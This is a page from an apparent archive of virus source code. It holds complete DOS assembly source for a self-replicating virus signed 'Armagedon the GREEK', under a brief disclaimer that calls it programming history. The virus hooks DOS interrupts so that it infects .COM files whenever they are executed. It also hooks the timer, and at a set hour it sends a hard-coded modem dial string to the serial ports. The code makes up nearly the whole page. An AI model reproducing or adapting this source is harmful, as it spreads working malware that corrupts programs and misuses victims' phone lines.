<a href="vw13_507_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13_507_asm.php">vw13_507_asm</a><br>
<a href="vw13534a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13534a_asm.php">vw13534a_asm</a><br>
<a href="vw13534_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13534_asm.php">vw13534_asm</a><br>
<a href="vw13534b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13534b_asm.php">vw13534b_asm</a><br>
<a href="vx_163_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vx_163_asm.php">vx_163_asm</a><br>
<a href="vx-163_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vx-163_asm.php">vx-163_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

dta         equ   offset last_byte+10
virlen      equ   (offset last_byte - offset start)
strlen      equ   (offset endstr - offset startstr)

code        segment
            assume  cs:code,ds:code
            org   100h

start:      jmp  main

newint21    proc  far         ; SETS THE 'INT 21h' VIRUSED
            pushf              ; Save flags for compare
            cmp  ah,0e0h      ; Is it exist-test?
            jnz  notest1      ; if not go on
            mov  ax,0dadah    ; else return signature,
            popf               ; restore flag and
            iret               ; return to program

notest1:    cmp  ah,0e1h
            jnz  notest2
            mov  ax,cs
            popf
            iret
notest2:    cmp  ax,4b00h                  ; is 'EXEC' command?
            jz   infector                  ; if yes go to 'infection'
do_oldint:  popf                            ; restore flags
            jmp  dword ptr cs:oldint21a    ; jump to normal INT 21h
newint21    endp

oldint21a   dw   ?           ; old INT 21h vector (low)
oldint21b   dw   ?           ; old INT 21h vector (high)
oldint8a    dw   ?           ; old INT 8 vector (low)
oldint8b    dw   ?           ; old INT 8 vector (high)
status      db   0           ; flag for time (call in progress)
ticks       db   0           ; 18.2 tick counter
cur_h       db   0           ; Current time (HOURS)
cur_m       db   0           ; Current time (MINUTES)
cur_s       db   0           ; Current time (SECONDS)
count       dw   0           ; dial counter (30 sec, 540 ticks)
garbidge    db   0
stringpos   db   0
call_made   db   0
init_done   db   0
comext      db   'COM'       ; Valid inf. extension
handle      dw   ?           ; inf. handle number
filesize    dw   20
prseg       dw   ?
seg_buffer  dw   ?
ss_reg      dw   ?
sp_reg      dw   ?
fileds      dw   ?
filedx      dw   ?
attr        dw   ?
filedate    dw   ?
filetime    dw   ?

env_seg     dw   00h
cdline_offs dw   81h
cdline_seg  dw   ?
fcb1_offs   dw   5ch
fcb1_seg    dw   ?
fcb2_offs   dw   6ch
fcb2_seg    dw   ?

infector    proc   near        ; PROGRAM INFECTOR
            assume  cs:code    ;

            push  ds          ; save registers to
            push  bx          ; insure normal operation
            push  si          ; by the INT 21h (ah=4b00h)
            push  cx          ;
            push  ax          ;
            push  dx          ;
            push  bp          ;
            push  es          ;
            push  di          ;

            cld                ; Reset direction to increament
            push  dx           ; Store the address of the
            push  ds           ; filespec (DS:DX)
            xor   cx,cx        ; reset counter
            mov   si,dx        ; set ptr to filespec
nxtchr:     mov   al,ds:[si]   ; take a char
            cmp   al,0         ; is it zero?
            jz    okay         ; if yes goto okay
            inc   cx           ; else increase counter
            inc   si           ; and pointer
            jmp   nxtchr       ; take the next chr if CX>0
okay:
            add   dx,cx        ; Point to end of filespec
            sub   dx,3         ; point to .EXT
            mov   si,offset comext   ; Check if it is a
            mov   di,dx              ; .COM file
            cmp   byte ptr ds:[di-3],'N';
            jnz   ok_1                    ; Is it a ND. ?
            cmp   byte ptr ds:[di-2],'D'  ; if yes exit!
            jz    nmatch                  ;
ok_1:       mov   cx,3                    ; checking counter in 3
cmp_loop:   mov   al,cs:[si]              ; take 1st ptr's chr
            cmp   al,ds:[di]              ; and compare it with filespec
            jnz   nmatch                  ; If no matching, exit
            inc   si                      ; else increase 1st ptr
            inc   di                      ; and second ptr
            loop  cmp_loop                ; take next compare if CX>0

            pop   ds                      ; restore ds and dx to point
            pop   dx                      ;

            push  dx                      ; Store pointer
            push  ds                      ;
            mov   si,dx                   ; Check if filespec
            mov   dl,0                    ; contains a drive
            cmp   byte ptr ds:[si+1],':'  ; letter
            jnz   nodrive                 ; If no jump to nodrive spec.
            mov   dl,ds:[si]              ; else take the drive in DL
            and   dl,0fh                  ; and modify for int 21h (ah=36h)
nodrive:    mov   ah,36h                  ; Take free disk space of DL disk
            int   21h                     ; Do the call
            cmp   ax,0ffffh               ; Was an invalid drive specified?
            jz    nmatch                  ; if yes, exit
            jmp   bypass                  ; Correct jx 127 limit

nmatch:     jmp   nomatch
invd:       jmp   invdrive
closeit1:   jmp   closeit
resdta1:    jmp   resdta

bypass:     cmp   bx,3        ; Are there at least 3 clust. free?
            jb    nmatch      ; If no, exit
            pop   ds          ; restore pointers
            pop   dx          ;

            push  ds          ; and allocate memory
            push  dx          ; for the infection
            mov   cs:fileds,ds
            mov   cs:filedx,dx
            mov   ax,4300h    ; code for Get Attr
            int   21h
            mov   cs:attr,cx
            mov   ax,4301h
            xor   cx,cx
            int   21h

            mov   bx,0ffffh
            mov   ah,48h
            int   21h
            mov   ah,48h
            int   21h
            mov   cs:seg_buffer,ax

            mov   ax,cs
            mov   ds,ax
            mov   dx,dta
            mov   ah,1ah
            int   21h

            pop   dx
            pop   ds
            mov   ax,3d02h       ; DosFn OPEN FILE (R/W)
            clc                  ; Clear carry flag
            int   21h            ; Do open
            jc    closeit1       ; If Error exit
            mov   bx,ax          ; Handle to BX
            mov   cs:handle,ax   ; save handle
            mov   cx,0ffffh      ; Bytes to read
            mov   ax,cs:seg_buffer   ;
            mov   ds,ax           ;
            mov   dx,virlen       ; DS:DX points to buffer
            mov   ah,3fh          ; DosFn READ FROM FILE
            clc                   ; clear carry flag
            int   21h             ; Do the call
            jc    closeit1        ; if error exit
            mov   cs:filesize,ax  ; Num of bytes actually read
            ;cmp  ax,0e000h       ; max com size to infect
            ;ja   closeit1        ; if size>max exit
            cmp   ax,virlen       ; if filesize is less than the
            jb    virit           ; virus size then it is clean
            mov   si,virlen+1     ; Set 1st ptr to START of file
            add   si,si           ; add 1st ptr the length of file
            sub   si,21           ; and subtract 12 to point to sig.
            mov   cx,19           ; set the test loop to 10 bytes
            mov   di,offset signature  ; Set 2nd ptr to constant signature
test_sig:   mov   al,ds:[si]      ; take the byte pointed to by SI
            mov   ah,cs:[di]      ; and compare it with the byte
            cmp   ah,al           ; pointed to by DI
            jne   virit           ; if not equal then it is clean!
            inc   si              ; else increase 1st pointer
            inc   di              ; increase 2nd pointer
            loop  test_sig        ; continue with next if CX>0
            jmp   closeit

virit:      mov   ax,4200h        ; Code for LSEEK (Start)
            mov   bx,cs:handle    ; Handle num in BX
            xor   cx,cx           ; Reset CX
            mov   dx,cx           ; and DX
            int   21h             ; Do the call
            jc    closeit

            mov   si,offset start
            mov   cx,virlen
            xor   di,di
            mov   ax,cs:seg_buffer
            mov   ds,ax
virusin:    mov   al,cs:[si]
            mov   ds:[di],al
            inc   si
            inc   di
            loop  virusin

            mov   ax,5700h
            mov   bx,cs:handle
            int   21h
            mov   cs:filetime,cx
            mov   cs:filedate,dx

            mov   ax,cs:seg_buffer
            mov   ds,ax

            mov   si,virlen
            mov   al,ds:[si]
            add   al,11
            mov   ds:[si],al

            xor   dx,dx           ; DX points to Buffer (file)
            mov   cx,cs:filesize  ; Size of file in CX
            add   cx,virlen       ; But added by Virlen
            mov   bx,cs:handle    ; File handle num in BX
            mov   ah,40h          ; Code for WRITE FILE
            int   21h             ; Do the call

            mov   cx,cs:filetime
            mov   dx,cs:filedate
            mov   bx,cs:handle
            mov   ax,5701h
            int   21h

closeit:    mov   bx,cs:handle    ; Handle in BX
            mov   ah,3eh          ; Code for CLOSE FILE
            int   21h             ; Do close it
            push  cs
            pop   ds
resdta:     mov   dx,80h          ; Reset the DTA
            mov   ah,1ah          ; in Address 80H
            int   21h             ; Do call
            mov   ax,cs:seg_buffer
            mov   es,ax
            mov   ah,49h
            int   21h

            mov   ax,cs:fileds     ;
            mov   ds,ax            ;
            mov   dx,cs:filedx     ;
            mov   ax,4301h         ;
            mov   cx,cs:attr       ;
            int   21h              ;
            jmp   invdrive         ; and exit
nomatch:
            pop   ds
            pop   dx
            jmp   notinfect

invdrive:
notinfect:
            pop   di          ; restore registers
            pop   es          ; to their initial
            pop   bp          ; values
            pop   dx          ;
            pop   ax          ;
            pop   cx          ;
            pop   si          ;
            pop   bx          ;
            pop   ds          ;
            jmp   do_oldint   ; return from call
infector    endp

newint8     proc  far        ; VIRUS' TIMER ISR

            push  bp          ;
            push  ds          ; store all registers
            push  es         ; and flags before
            push  ax          ; the new timer
            push  bx          ; operations.
            push  cx         ; Otherwize a 'crush'
            push  dx         ; is unavoidable
            push  si          ;
            push  di          ;
            pushf             ; Simulate an INT
            call  dword ptr cs:oldint8a ; Do old timer stuff
            call  tick       ; update virus clock routine
            push  cs
            pop   ds
            mov   ah,5         ; Check if time
            mov   ch,cur_h     ; is now above the
            cmp   ah,ch        ; lower limit (5 o'clock)
            ja    exitpoint    ; if not, exit
            mov   ah,6         ; Check if time
            cmp   ah,ch        ; is now below the higher limit
            jb    exitpoint    ; if not, exit
            mov   ah,status    ; get the virus status
            cmp   ah,1         ; test if call in progress
            jz    in_progress   ; if yes goto countdown routine
            mov   ah,1         ; if not, set the status to
            mov   status,ah    ; indicate 'In progress'
            jmp   exitpoint    ; and exit
in_progress:                   ; CALL IS IN PROGRESS!
            call  dial        ; else call dial routine
            inc   count        ; CALL_TIMER
            mov   ax,count
            cmp   ax,540       ; check for time-out
            jne   exitpoint    ; if not, exit else
            xor   ax,ax        ; set status to indicate
            mov   status,ah    ; 'ready to call'!
            mov   count,ax     ; reset call_timer
            mov   call_made,ah
exitpoint:
            pop   di          ; restore registers to
            pop   si          ; their values and
            pop   dx          ;
            pop   cx          ;
            pop   bx          ;
            pop   ax          ;
            pop   es          ;
            pop   ds          ;
            pop   bp          ;
            iret              ; return to program
newint8     endp

tick        proc   near         ; VIRUS' CLOCK ROUTINE
            assume  cs:code,ds:code

            push  cs
            pop   ds
            xor   al,al
            mov   ah,ticks       ; test if ticks have
            cmp   ah,17          ; reached limit (17)
            jnz   incticks       ; if no, incerase ticks
            mov   ah,cur_s       ; test if seconds have
            cmp   ah,59          ; reached limit (59)
            jnz   incsec         ; if no, increase seconds
            mov   ah,cur_m       ; test if minutes have
            cmp   ah,59          ; reached limit (59)
            jnz   incmin         ; if no, increase minutes
            mov   ah,cur_h       ; test if hours have
            cmp   ah,23          ; reached limit (23)
            jnz   inchour        ; if no, increase hours
            mov   cur_h,al       ; else reset hours
exitp3:     mov   cur_m,al       ; reset minutes
exitp2:     mov   cur_s,al       ; reset seconds
exitp1:     mov   ticks,al       ; reset ticks
            ret                  ; end exit
incticks:   inc   ticks          ; increase ticks
            ret                  ; and exit
incsec:     inc   cur_s          ; increase seconds
            jmp   exitp1         ; and exit
incmin:     inc   cur_m          ; increase minutes
            jmp   exitp2         ; and exit
inchour:    inc   cur_h          ; increase hours
            jmp   exitp3         ; end exit
tick        endp

startstr:
string      db    '+++aTh0m0s7=35dp081,,,,141'
endstr:

dial        proc   near
            assume  cs:code,ds:code

            mov   al,call_made
            cmp   al,1
            jz    exit_dial
            mov   al,init_done
            cmp   al,1
            jz    send_one

            mov   cx,3
next_init:  mov   dx,cx
            xor   ah,ah
            mov   al,131
            int   14h
            loop  next_init
            mov   al,1
            mov   init_done,al
            jmp   exit_dial

send_one:   push  cs
            pop   ds
            mov   si,offset string
            mov   al,stringpos
            cmp   al,strlen
            jnz   do_send
            jmp   sendret

do_send:    xor   ah,ah
            add   si,ax
next_char:  mov   al,[si]
            mov   dx,3f8h
            out   dx,al
            mov   dx,2f8h
            out   dx,al
            mov   dx,2e8h
            out   dx,al
            mov   dx,3e8h
            out   dx,al
            inc   stringpos
            jmp   exit_dial

sendret:    mov   cx,3
retloop:    mov   dx,cx
            mov   al,13
            mov   ah,1
            int   14h
            loop  retloop

reset:      mov   ax,0001h
            mov   call_made,al
            mov   stringpos,ah
            mov   init_done,ah
exit_dial:  ret
dial        endp

main:                                   ; VIRUS' MEMORY INSTALLER
            assume  cs:code,ds:code     ;

            mov   ah,0e0h               ; is VIRUS already
            int   21h                   ; in memory?
            cmp   ax,0dadah             ; if yes then
            jnz   cont                  ; terminate, else
            jmp   already_in
cont:       push  cs
            pop   ds
            mov   ax,3521h              ; capture the old
            int   21h                   ; INT 21h vector and
            mov   oldint21a,bx          ; store the absolute address
            mov   oldint21b,es          ; in 'oldint21x' variables
            mov   dx,offset newint21    ; point to new INT 21h ISR
            mov   ax,2521h              ; replace it to vector
            int   21h                   ;
            mov   ax,3508h              ; capture the old
            int   21h                   ; timer vector and
            mov   oldint8a,bx           ; store the address
            mov   oldint8b,es           ; in 'oldint8x' var
            mov   dx,offset newint8     ; point to new timer ISR
            mov   ax,2508h              ; replace it to vector
            int   21h                   ;
            mov   ah,2ch                ; get the current
            int   21h                   ; time from DOS
            mov   cur_h,ch              ; and store it
            mov   cur_m,cl              ; for the
            mov   cur_s,dh              ; virus' timer
; RUN PROGRAM!
            mov   ax,cs:[2ch]
            mov   ds,ax
            xor   si,si
loop1:      mov   al,ds:[si]
            cmp   al,1
            jz    exitl1
            inc   si
            jmp   loop1
exitl1:     inc   si
            inc   si
            mov   dx,si

            mov   ax,cs
            mov   es,ax       ; SHRINK  BLOCK
            mov   bx,90
            mov   ah,4ah
            int   21h

            mov   bx,cs:[81h]
            mov   ax,cs
            mov   es,ax
            mov   cs:fcb1_seg,ax
            mov   cs:fcb2_seg,ax
            mov   cs:cdline_seg,ax
            mov   ax,4b00h
            ;
            ;
            ;
            mov   cs:ss_reg,ss
            mov   cs:sp_reg,sp
            pushf
            call  dword ptr cs:oldint21a
            mov   ax,cs:ss_reg
            mov   ss,ax
            mov   ax,cs:sp_reg
            mov   sp,ax
            mov   ax,cs
            mov   ds,ax
            mov   dx,offset last_byte
            int   27h

already_in: mov   ah,0e1h
            int   21h
            mov   si,offset pokelabl
            mov   cs:[si+3],ax
            mov   ax,offset fix_com
            mov   cs:[si+1],ax
            mov   ax,cs:filesize
            mov   bx,cs
pokelabl:   db    0eah,00h,00h,00h,00h

fix_com:    mov   cx,ax
            mov   ds,bx
            mov   si,100h
            mov   di,100h+virlen
dofix:      mov   al,ds:[di]
            mov   ds:[si],al
            inc   si
            inc   di
            loop  dofix
            mov   si,offset poklb
            mov   cs:[si+3],ds
            mov   al,ds:[100h]
            sub   al,11
            mov   ds:[100h],al
            mov   ax,ds
            mov   es,ax
            mov   ss,ax
poklb:      db    0eah,00h,01h,00h,00h

signature:  db    'Armagedon the GREEK'
last_byte:  db    90h+11
            nop
            nop
            nop
            mov   ah,4ch
            int   21h
code        ends

end         start

</textarea></td></tr></table></body></html>
